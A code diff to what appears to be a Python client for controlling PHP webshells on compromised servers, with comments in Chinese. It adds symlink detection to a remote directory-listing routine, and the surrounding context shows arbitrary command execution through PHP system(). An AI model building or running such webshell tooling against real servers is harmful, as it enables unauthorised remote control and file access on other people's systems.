@@ -25,8 +25,7 @@ class PHPWebshellOptions:
     """除了submit_raw之外的函数需要的各类选项"""
 
     encoder: t.Literal["raw", "base64"] = "raw"
-    http_params_obfs: bool = False # TODO: remove me
-
+    http_params_obfs: bool = False  # TODO: remove me
 
 
 class PHPWebshellMixin:
@@ -48,6 +47,7 @@ class PHPWebshellMixin:
         return await self.submit(f"system({cmd!r});")
 
     async def list_dir(self, dir_path: str) -> t.List[DirectoryEntry]:
+        """列出某个文件夹中的内容，包括`.`和`..`，如果没有内容则会填充`..`"""
         dir_path = dir_path.removesuffix("/") + "/"
         php_code = """
         error_reporting(0);
@@ -56,9 +56,19 @@ class PHPWebshellMixin:
         $result = array();
         foreach ($files as $file) {
             $filePath = $folderPath . $file;
+            $fileType = filetype($filePath);
+            if($fileType == "link") {
+                if(is_dir($filePath)) {
+                    $fileType = "link-dir";
+                }else if(is_file($filePath)) {
+                    $fileType = "link-file";
+                }else{
+                    $fileType = "unknown";
+                }
+            }
             array_push($result, array(
                 "name" => basename($file),
-                "type" => filetype($filePath),
+                "type" => $fileType,
                 "permission" => substr(decoct(fileperms($filePath)), -3)
             ));
         }
@@ -77,12 +87,18 @@ class PHPWebshellMixin:
             DirectoryEntry(
                 name=item["name"],
                 permission=item["permission"],
-                entry_type=item["type"],
+                entry_type=(
+                    item["type"]
+                    if item["type"] in ["dir", "file", "link-dir", "link-file"]
+                    else "unknown"
+                ),
             )
             for item in result
         ]
         if not any(entry.name == ".." for entry in result):
-            result.insert(0, DirectoryEntry(name="..", permission="000", entry_type="directory"))
+            result.insert(
+                0, DirectoryEntry(name="..", permission="555", entry_type="dir")
+            )
         return result
 
     async def get_file_contents(self, filepath: str) -> bytes:
